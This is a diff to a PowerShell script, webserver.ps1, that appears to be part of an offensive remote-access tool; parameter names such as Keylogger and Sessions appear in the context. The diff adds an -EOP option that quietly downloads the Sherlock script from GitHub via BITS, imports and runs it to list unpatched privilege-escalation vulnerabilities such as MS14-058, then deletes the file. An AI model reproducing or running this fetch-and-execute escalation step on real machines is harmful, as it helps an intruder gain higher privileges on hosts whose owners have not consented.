@@ -111,6 +111,16 @@
    can NOT be used together with other parameters because after
    completing is task (Download file) it exits execution.
 
+.EXAMPLE
+   PS C:\> .\webserver.ps1 -EOP True
+   Find missing software patches for local privilege escalation.
+
+   Title      : TrackPopupMenu Win32k Null Point Dereference
+   MSBulletin : MS14-058
+   CVEID      : 2014-4113
+   Link       : https://www.exploit-db.com/exploits/35101/
+   VulnStatus : Appers Vulnerable
+
 .INPUTS
    None. You cannot pipe objects into webserver.ps1
 
@@ -132,6 +142,7 @@
    [string]$Sessions="False",
    [string]$Download="False",
    [string]$SEnum="False",
+   [string]$EOP="False",
    [int]$SPort='8086',
    [int]$SRDelay='2',
    [int]$STime='26',
@@ -170,6 +181,35 @@ $Banner = @"
 "@;
 Clear-Host;
 Write-Host $Banner;
+
+If($EOP -ne "False"){
+If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'False' -or $Keylogger -ne 'False'){
+   write-host "[warning] -EOP parameter can not be used together with other parameters .." -ForeGroundColor Yellow
+   Start-Sleep -Seconds 1
+}
+
+   ## Download Sherlock from @rasta-mouse github repository
+   Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1 -Destination $Env:TMP\Sherlock.ps1 -ErrorAction SilentlyContinue|Out-Null   
+
+   ## Check for file download integrity (fail/corrupted downloads)
+   $SizeDump = ((Get-Item -Path "$Env:TMP\Sherlock.ps1" -EA SilentlyContinue).length/1KB)
+   If(-not(Test-Path -Path "$Env:TMP\Sherlock.ps1") -or $SizeDump -lt 16){
+      ## Fail to download Sherlock.ps1 using curl.exe OR download file corrupted
+      Write-Host "[abort] fail to download Sherlock.ps1 using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
+      Start-Sleep -Seconds 1
+      exit ## exit @webserver
+   }
+
+   ## Import-Module
+   If(Test-Path -Path "$Env:TMP\Sherlock.ps1"){
+      Write-Host "Find missing software patchs for privilege escalation" -ForeGroundColor DarkGreen
+      Import-Module $Env:TMP\Sherlock.ps1
+      Find-AllVulns
+   }
+   
+   Remove-Item -Path "$Env:TMP\Sherlock.ps1" -Force
+   Write-Host "";exit ## exit @webserver
+}
 
 If($Download -ne "False"){
 $ServerIP = $Download.split(',')[0] ## Extract server ip addr from -Download "string"
@@ -776,6 +816,7 @@ If(-not($Installation) -or $Installation -ieq $null){
          write-host "WebServerTitle   : $WebTitle`n"
 
       If($SEnum -ieq "Verbose"){
+         Write-Host ""
          ## Display @webserver firewall rule
          Get-NetFirewallRule|Where { $_.DisplayName -eq 'python.exe' }|Select-Object DisplayName,Description,Enabled,Profile,Direction,Action|Format-Table -AutoSize > $Env:TMP\PSfirewall.log
          Get-Content -Path "$Env:TMP\PSfirewall.log";Remove-Item -Path "$Env:TMP\PSfirewall.log" -Force
